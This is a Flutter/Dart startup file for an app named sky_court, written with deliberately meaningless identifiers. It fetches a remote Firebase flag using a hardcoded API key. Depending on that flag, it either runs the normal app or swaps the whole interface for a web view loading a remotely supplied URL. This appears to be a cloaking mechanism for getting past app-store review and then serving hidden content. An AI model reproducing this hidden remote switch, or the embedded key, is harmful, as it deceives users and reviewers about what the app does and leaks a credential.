import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:sky_court/fhjkghjghj/fsdfsdfsdf/sdfsdfsdf.dart';
import 'package:sky_court/fhjkghjghj/fsdfsdfsdf/asdfadfasf.dart';
import 'package:sky_court/fhjkghjghj/fsdfsdfsdf/fsdfsdfsdf/fsdfsdfsdf.dart';
import 'package:sky_court/fhjkghjghj/sdfsdfsdf.dart';
import 'package:sky_court/main.dart';

startLogic() async {
  final Lsdfsdfsdf? model = await Pdsfsdfsgf().ssdfs();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: UYJsddfhdfh(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      runApp(const MyApp());
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://sky-court-55-default-rtdb.firebaseio.com/premium.json?auth=AIzaSyDTwN4PdugvHaHcFz28vicpY8_s-HfHATY');
      final fBResponseModel = Odsafadf.fromJson(result.data);
      await Pdsfsdfsgf().bgdfgs(
        Lsdfsdfsdf(
          secondUrl: '${fBResponseModel.asfasfa3}${fBResponseModel.asasfasf4}',
          isOpen: fBResponseModel.safafafis,
        ),
      );

      if (fBResponseModel.safafafis) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: UYJsddfhdfh(
              link: '${fBResponseModel.sddfsfs1}${fBResponseModel.asdasfaf2}',
            ),
          ),
        );
      } else {
        runApp(const MyApp());
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
